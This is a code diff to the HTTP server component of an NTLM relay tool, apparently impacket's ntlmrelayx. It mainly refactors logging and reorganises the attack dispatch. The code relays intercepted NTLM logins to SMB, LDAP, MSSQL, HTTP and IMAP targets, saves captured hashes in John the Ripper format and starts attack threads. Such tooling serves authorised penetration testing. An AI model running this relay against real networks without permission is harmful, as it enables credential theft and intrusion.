@@ -12,12 +12,11 @@
 #  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
 #
 # Description:
-#             This is the HTTP server which relays the NTLMSSP 
-#   messages to other protocols
+#             This is the HTTP server which relays the NTLMSSP  messages to other protocols
+
 import SimpleHTTPServer
 import SocketServer
 import base64
-import logging
 import random
 import struct
 import string
@@ -51,13 +50,13 @@ class HTTPRelayServer(Thread):
                     # Reflection mode, defaults to SMB at the target, for now
                     self.server.config.target = TargetsProcessor(singletarget = 'SMB://%s:445/' % client_address[0])
                 self.target = self.server.config.target.get_target(client_address[0],self.server.config.randomtargets)
-                logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target[1]))
+                LOG.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target[1]))
             try:
                 SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
             except Exception, e:
                 import traceback
                 print traceback.print_exc()
-                logging.error(str(e))
+                LOG.error(str(e))
 
         def handle_one_request(self):
             try:
@@ -67,7 +66,7 @@ class HTTPRelayServer(Thread):
             except Exception, e:
                 #import traceback
                 #print traceback.print_exc()
-                logging.error('Exception in HTTP request handler: %s' % e)
+                LOG.error('Exception in HTTP request handler: %s' % e)
 
         def log_message(self, format, *args):
             return
@@ -134,32 +133,39 @@ class HTTPRelayServer(Thread):
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
-                if not self.do_ntlm_auth(token,authenticateMessage):
-                    logging.error("Authenticating against %s as %s\%s FAILED" % (
-                    self.target[1], authenticateMessage['domain_name'], authenticateMessage['user_name']))
 
-                    #Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
+                if not self.do_ntlm_auth(token,authenticateMessage):
+                    LOG.error("Authenticating against %s as %s\%s FAILED" % (
+                        self.target, authenticateMessage['domain_name'].decode('utf-16le'),
+                        authenticateMessage['user_name'].decode('utf-16le')))
+
+                    # Only skip to next if the login actually failed, not if it was just anonymous login or a system account which we don't want
                     if authenticateMessage['user_name'] != '': # and authenticateMessage['user_name'][-1] != '$':
                         self.server.config.target.log_target(self.client_address[0],self.target)
-                        #No anonymous login, go to next host and avoid triggering a popup
+                        # No anonymous login, go to next host and avoid triggering a popup
                         self.do_REDIRECT()
                     else:
-                        #If it was an anonymous login, send 401
+                        # If it was an anonymous login, send 401
                         self.do_AUTHHEAD('NTLM')
                 else:
                     # Relay worked, do whatever we want here...
-                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (
-                    self.target[1], authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    LOG.info("Authenticating against %s as %s\%s SUCCEED" % (
+                        self.target, authenticateMessage['domain_name'].decode('utf-16le'),
+                        authenticateMessage['user_name'].decode('utf-16le')))
+
                     ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                         authenticateMessage['user_name'],
                                                         authenticateMessage['domain_name'],
                                                         authenticateMessage['lanman'], authenticateMessage['ntlm'])
+                    self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
+
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
+
                     self.server.config.target.log_target(self.client_address[0],self.target)
 
-                    self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
-                    self.do_attack( {'CHALLENGE_MESSAGE': self.challengeMessage} )
+                    self.do_attack()
+
                     # And answer 404 not found
                     self.send_response(404)
                     self.send_header('WWW-Authenticate', 'NTLM')
@@ -183,7 +189,8 @@ class HTTPRelayServer(Thread):
 
         def do_ntlm_auth(self,token,authenticateMessage):
             #For some attacks it is important to know the authenticated username, so we store it
-            self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'))).upper()
+            self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
+                                        authenticateMessage['user_name'].decode('utf-16le'))).upper()
 
             if authenticateMessage['user_name'] != '' or self.target[1] == '127.0.0.1':
                 clientResponse, errorCode = self.client.sendAuth(token)
@@ -197,23 +204,24 @@ class HTTPRelayServer(Thread):
 
             return False
 
-        def do_attack(self, connData=False):
+        def do_attack(self):
             if self.target[0] == 'SMB' or self.target[0] == 'MSSQL':
                 if self.server.config.runSocks is True:
-                    # For now, we only support SOCKS for SMB and MSSQL, for now.
+                    # For now, we only support SOCKS for SMB/MSSQL, for now.
                     # Pass all the data to the socksplugins proxy
                     activeConnections.put((self.target[1], self.client.targetPort, self.authUser, self.client.session, self.client.sessionData))
+                elif self.target[0] == 'MSSQL':
+                    clientThread = self.server.config.attacks['MSSQL'](self.server.config, self.client.session)
+                    clientThread.start()
                 else:
                     clientThread = self.server.config.attacks['SMB'](self.server.config, self.client.session, self.authUser)
                     clientThread.start()
+
             if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
                 clientThread = self.server.config.attacks['LDAP'](self.server.config, self.client.session, self.authUser)
                 clientThread.start()
             if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
                 clientThread = self.server.config.attacks['HTTP'](self.server.config, self.client.session, self.authUser)
-                clientThread.start()
-            if self.target[0] == 'MSSQL':
-                clientThread = self.server.config.attacks['MSSQL'](self.server.config, self.client.session)
                 clientThread.start()
             if self.target[0] == 'IMAP' or self.target[0] == 'IMAPS':
                 clientThread = self.server.config.attacks['IMAP'](self.server.config, self.client.session, self.authUser)
@@ -225,11 +233,11 @@ class HTTPRelayServer(Thread):
         self.config = config
 
     def run(self):
-        logging.info("Setting up HTTP Server")
+        LOG.info("Setting up HTTP Server")
         httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.config)
         try:
              httpd.serve_forever()
         except KeyboardInterrupt:
              pass
-        logging.info('Shutting down HTTP Server')
+        LOG.info('Shutting down HTTP Server')
         httpd.server_close()
